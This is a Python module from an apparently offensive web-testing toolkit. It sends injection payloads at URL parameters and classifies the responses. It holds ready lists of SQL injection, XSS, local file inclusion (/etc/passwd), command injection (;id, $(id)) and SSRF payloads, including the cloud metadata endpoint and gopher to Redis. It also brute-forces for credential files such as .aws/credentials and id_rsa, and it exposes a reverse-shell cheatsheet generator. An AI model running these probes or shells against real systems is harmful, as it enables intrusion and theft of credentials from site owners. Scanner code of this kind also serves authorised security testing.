"""Web attack helpers: injection probes, directory brute, header abuse, CVE hints.

Everything here targets only hosts you are authorised to test. Probes are
read-only: they send payloads and classify the response, nothing destructive.
"""

import re
import time
import urllib.parse

from . import recon

SQLI_ERROR_SIGNS = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "pg_query()", "psql:", "sqlite3.OperationalError",
    "ORA-01756", "Microsoft OLE DB Provider for SQL Server", "ODBC SQL Server Driver",
    "syntax error at or near", "SQLSTATE", "mysql_fetch", "supplied argument is not a valid MySQL",
]

SQLI_PAYLOADS = [
    ("'", "single quote"),
    ("\"", "double quote"),
    ("')", "quote paren"),
    ("' OR '1'='1", "boolean true"),
    ("' OR '1'='2", "boolean false"),
    ("1' AND SLEEP(5)-- -", "time based mysql"),
    ("1); SELECT pg_sleep(5)-- -", "time based postgres"),
    ("' UNION SELECT NULL-- -", "union"),
    ("'; WAITFOR DELAY '0:0:5'-- -", "time based mssql"),
]

XSS_PAYLOADS = [
    ("<script>alert(1)</script>", "script tag"),
    ("\"><script>alert(1)</script>", "attribute break"),
    ("<img src=x onerror=alert(1)>", "img onerror"),
    ("javascript:alert(1)", "js uri"),
    ("<svg/onload=alert(1)>", "svg onload"),
    ("'\"><body onload=alert(1)>", "body onload"),
]

LFI_PAYLOADS = [
    ("../../../../etc/passwd", "traversal 4"),
    ("....//....//....//etc/passwd", "filter bypass"),
    ("/etc/passwd", "absolute"),
    ("php://filter/convert.base64-encode/resource=index.php", "php filter"),
    ("..%2f..%2f..%2fetc%2fpasswd", "url encoded"),
]

COMMAND_INJECTION = [
    (";id", "semicolon"),
    ("|id", "pipe"),
    ("$(id)", "substitution"),
    ("`id`", "backtick"),
    ("%0aid", "newline"),
    ("; sleep 5", "time based"),
]

LFI_SIGNS = ["root:x:0:0", "root:*:0:0", "daemon:x:", "[boot loader]"]

SQL_ERROR_LOGS = ["mysql", "syntax", "sql", "postgres", "oracle", "sqlite"]

REDIRECT_PAYLOADS = [
    "//evil.example.com",
    "https://evil.example.com",
    "/\\evil.example.com",
    "////evil.example.com",
]

SSRF_TARGETS = [
    "http://127.0.0.1:80/", "http://127.0.0.1:22/", "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/", "http://0.0.0.0/", "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO",
]

COMMON_DIRS = [
    "admin", "administrator", "login", "dashboard", "panel", "cpanel", "manage",
    "api", "v1", "v2", "graphql", "swagger", "docs", "redoc", "openapi.json",
    "backup", "backups", "bak", "old", "tmp", "temp", "test", "dev", "staging",
    "private", "secret", "hidden", "internal", "config", "conf", "settings",
    "uploads", "files", "static", "assets", "media", "images", "css", "js",
    "wp-admin", "wp-content", "wp-includes", "wp-json", "xmlrpc.php",
    "phpmyadmin", "pma", "mysql", "adminer.php", "db", "database", "sql",
    "server-status", "server-info", ".git", ".svn", ".env", ".htaccess",
    "web.config", "robots.txt", "sitemap.xml", "crossdomain.xml", "health",
    "status", "metrics", "debug", "trace", "console", "shell", "cmd", "exec",
]

SENSITIVE_EXTENSIONS = [
    ".git/HEAD", ".git/config", ".env", ".env.local", ".env.production",
    "wp-config.php.bak", "config.php.bak", "database.sql", "backup.sql",
    "dump.sql", "db.sqlite", "id_rsa", "id_rsa.pub", ".bash_history",
    ".aws/credentials", ".docker/config.json", "docker-compose.yml",
]


def inject_param(url, param, payload):
    """Replace one query parameter with a payload, return the full URL."""
    parts = urllib.parse.urlsplit(url)
    query = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    rebuilt = [(k, payload if k == param else v) for k, v in query]
    return urllib.parse.urlunsplit(parts._replace(query=urllib.parse.urlencode(rebuilt)))


def test_sqli(url, param, delay=0.0):
    """Error-based and time-based SQLi probe. Returns list of hits."""
    hits = []
    baseline = recon.http_fetch(url, timeout=8.0)
    base_body = baseline["body"].decode("utf-8", "replace").lower()

    for payload, label in SQLI_PAYLOADS:
        target = inject_param(url, param, payload)
        started = time.time()
        result = recon.http_fetch(target, timeout=15.0)
        elapsed = time.time() - started
        body = result["body"].decode("utf-8", "replace").lower()

        if "sleep" in label or "waitfor" in label or "pg_sleep" in label:
            if elapsed >= 4.0:
                hits.append({"type": "sqli-time", "param": param, "payload": payload,
                             "evidence": "response delayed %.1fs" % elapsed})
            continue

        for sign in SQLI_ERROR_SIGNS:
            if sign.lower() in body and sign.lower() not in base_body:
                hits.append({"type": "sqli-error", "param": param, "payload": payload,
                             "evidence": sign})
                break
        if delay:
            time.sleep(delay)
    return hits


def test_xss(url, param, delay=0.0):
    """Reflected XSS probe: payload survives unencoded in the response."""
    hits = []
    for payload, label in XSS_PAYLOADS:
        target = inject_param(url, param, payload)
        result = recon.http_fetch(target, timeout=8.0)
        body = result["body"].decode("utf-8", "replace")
        if payload in body:
            hits.append({"type": "xss-reflected", "param": param, "payload": payload,
                         "evidence": "payload reflected verbatim"})
        elif urllib.parse.quote(payload) in body:
            hits.append({"type": "xss-encoded", "param": param, "payload": payload,
                         "evidence": "payload reflected URL-encoded"})
        if delay:
            time.sleep(delay)
    return hits


def test_lfi(url, param, delay=0.0):
    """Local file inclusion probe against file-reading parameters."""
    hits = []
    for payload, label in LFI_PAYLOADS:
        target = inject_param(url, param, payload)
        result = recon.http_fetch(target, timeout=8.0)
        body = result["body"].decode("utf-8", "replace")
        for sign in LFI_SIGNS:
            if sign in body:
                hits.append({"type": "lfi", "param": param, "payload": payload,
                             "evidence": sign})
                break
        else:
            if payload.startswith("php://filter") and len(body) > 200 and re.fullmatch(r"[A-Za-z0-9+/=\s]+", body.strip()[:200]):
                hits.append({"type": "lfi-b64", "param": param, "payload": payload,
                             "evidence": "base64 blob returned"})
        if delay:
            time.sleep(delay)
    return hits


def test_command_injection(url, param, delay=0.0):
    hits = []
    for payload, label in COMMAND_INJECTION:
        target = inject_param(url, param, payload)
        started = time.time()
        result = recon.http_fetch(target, timeout=15.0)
        elapsed = time.time() - started
        body = result["body"].decode("utf-8", "replace")
        if re.search(r"uid=\d+\([^)]+\)\s+gid=\d+", body):
            hits.append({"type": "rce", "param": param, "payload": payload,
                         "evidence": "id output returned"})
        elif "sleep" in payload and elapsed >= 4.0:
            hits.append({"type": "rce-blind", "param": param, "payload": payload,
                         "evidence": "delayed %.1fs" % elapsed})
        if delay:
            time.sleep(delay)
    return hits


def test_open_redirect(url, param, delay=0.0):
    """Only a real redirect counts: a Location header pointing off-site.
    A payload merely echoed in the query string is not a finding."""
    hits = []
    for payload in REDIRECT_PAYLOADS:
        target = inject_param(url, param, payload)
        # Do not follow: a chased redirect hides the Location header.
        result = recon.http_fetch(target, timeout=8.0, follow_redirects=False)
        location = ""
        for key, value in (result.get("headers") or {}).items():
            if key.lower() == "location":
                location = value
        if "evil.example.com" in location.lower():
            hits.append({"type": "open-redirect", "param": param, "payload": payload,
                         "evidence": "Location: " + location[:60]})
        if delay:
            time.sleep(delay)
    return hits


def extract_forms(html):
    """Pull forms and their inputs out of a page."""
    forms = []
    for form_match in re.finditer(r"<form\b[^>]*>(.*?)</form>", html, re.I | re.S):
        tag = form_match.group(0)[:form_match.group(0).find(">") + 1]
        action = re.search(r'action\s*=\s*["\']([^"\']*)', tag, re.I)
        method = re.search(r'method\s*=\s*["\']([^"\']*)', tag, re.I)
        inputs = []
        for input_match in re.finditer(r"<input\b[^>]*>", form_match.group(1), re.I):
            name = re.search(r'name\s*=\s*["\']([^"\']*)', input_match.group(0), re.I)
            if name:
                inputs.append(name.group(1))
        forms.append({
            "action": action.group(1) if action else "",
            "method": (method.group(1) if method else "get").upper(),
            "inputs": inputs,
        })
    return forms


def extract_params(url):
    """Query parameters of a URL plus parameters seen in its forms."""
    parts = urllib.parse.urlsplit(url)
    params = [k for k, _ in urllib.parse.parse_qsl(parts.query, keep_blank_values=True)]
    result = recon.http_fetch(url, timeout=8.0)
    if not result["error"]:
        html = result["body"].decode("utf-8", "replace")
        for form in extract_forms(html):
            params.extend(form["inputs"])
    seen, unique = set(), []
    for name in params:
        if name not in seen:
            seen.add(name)
            unique.append(name)
    return unique


def scan_url(url, params=None, delay=0.2):
    """Run every probe against every parameter. Only on hosts you own."""
    params = params or extract_params(url)
    report = {"url": url, "params": params, "findings": []}
    for param in params:
        report["findings"].extend(test_sqli(url, param, delay))
        report["findings"].extend(test_xss(url, param, delay))
        report["findings"].extend(test_lfi(url, param, delay))
        report["findings"].extend(test_command_injection(url, param, delay))
        report["findings"].extend(test_open_redirect(url, param, delay))
    return report


def dir_bruteforce(base_url, words=None, extensions=None, timeout=5.0, delay=0.0, status_filter=(200, 201, 204, 301, 302, 307, 401, 403, 405, 500)):
    """Directory/file discovery. Hits are filtered to interesting status codes."""
    words = words or COMMON_DIRS
    base = base_url.rstrip("/")
    hits = []
    for word in words:
        candidates = [word]
        if extensions:
            candidates += ["%s.%s" % (word, ext.lstrip(".")) for ext in extensions]
        for candidate in candidates:
            url = "%s/%s" % (base, candidate)
            result = recon.http_fetch(url, timeout=timeout, method="GET")
            status = result["status"]
            if status in status_filter:
                hits.append({
                    "url": url,
                    "status": status,
                    "size": len(result["body"]),
                })
            if delay:
                time.sleep(delay)
    return hits


def sensitive_file_scan(base_url, timeout=5.0):
    base = base_url.rstrip("/")
    hits = []
    for path in SENSITIVE_EXTENSIONS:
        url = "%s/%s" % (base, path)
        result = recon.http_fetch(url, timeout=timeout, method="GET")
        if result["status"] in (200, 206):
            preview = result["body"][:160].decode("utf-8", "replace").replace("\n", " ")
            hits.append({"url": url, "status": result["status"], "size": len(result["body"]), "preview": preview})
    return hits


def cors_check(url):
    """Look for wildcard / reflected CORS policy."""
    result = recon.http_fetch(url, timeout=8.0)
    headers = {k.lower(): v for k, v in (result.get("headers") or {}).items()}
    allow_origin = headers.get("access-control-allow-origin", "")
    allow_creds = headers.get("access-control-allow-credentials", "")
    verdict = "yok"
    if allow_origin == "*":
        verdict = "wildcard (*) - her origin okuyabilir"
    elif allow_origin:
        verdict = "origin yansitiliyor: %s" % allow_origin
    if allow_origin == "*" and allow_creds.lower() == "true":
        verdict += " | credential ile wildcard: tarayici engeller ama yanlis yapilandirma"
    return {"allow_origin": allow_origin, "allow_credentials": allow_creds, "verdict": verdict}


def security_txt_check(base_url):
    url = base_url.rstrip("/") + "/.well-known/security.txt"
    result = recon.http_fetch(url, timeout=8.0)
    if result["status"] == 200:
        return {"found": True, "url": url, "body": result["body"][:800].decode("utf-8", "replace")}
    return {"found": False, "url": url}


def cve_hints(server_header, tech_list):
    """Map banners to known bug classes. Not a vulnerability scanner."""
    hints = []
    joined = ("%s %s" % (server_header, " ".join(tech_list or []))).lower()
    table = [
        ("apache/2.4.49", "CVE-2021-41773 path traversal/RCE"),
        ("apache/2.4.50", "CVE-2021-42013 path traversal"),
        ("nginx/1.1", "eski nginx: request smuggling kontrolu"),
        ("iis/6", "CVE-2017-7269 WebDAV RCE"),
        ("iis/7", "eski IIS: WebDAV ve short-name (8.3) sizintisi"),
        ("php/5", "EOL PHP: bilinen RCE ve deserialization CVE'leri"),
        ("php/7.0", "EOL PHP: destek disi"),
        ("php/7.1", "EOL PHP: destek disi"),
        ("php/7.2", "EOL PHP: destek disi"),
        ("php/7.3", "EOL PHP: destek disi"),
        ("php/7.4", "EOL PHP: guvenlik yamasi yok"),
        ("openssh_7", "eski OpenSSH: CVE-2016-0777/0778"),
        ("openssh_8.5", "CVE-2024-6387 regreSSHion kontrolu"),
        ("weblogic", "CVE-2020-14882 konsol RCE"),
        ("jenkins", "anonim script konsolu ve CVE-2024-23897"),
        ("tomcat", "manager paneli ve CVE-2020-1938 Ghostcat"),
        ("wordpress", "plugin zafiyetleri, xmlrpc brute-force"),
        ("drupal", "Drupalgeddon serisi"),
        ("jira", "CVE-2019-11581 SSTI ve CVE-2021-26086 LFI"),
        ("confluence", "CVE-2023-22515 privilege escalation"),
        ("exchange", "ProxyLogon / ProxyShell serisi"),
        ("citrix", "CVE-2019-19781 path traversal"),
        ("fortinet", "CVE-2018-13379 credential leak"),
        ("pulse", "CVE-2019-11510 arbitrary file read"),
        ("elasticsearch", "acik index: veri sizmasi"),
    ]
    for token, description in table:
        if token in joined:
            hints.append((token, description))
    return hints


def reverse_shell_cheatsheet(host, port):
    from . import payloads
    return payloads.generate_all(host, port)
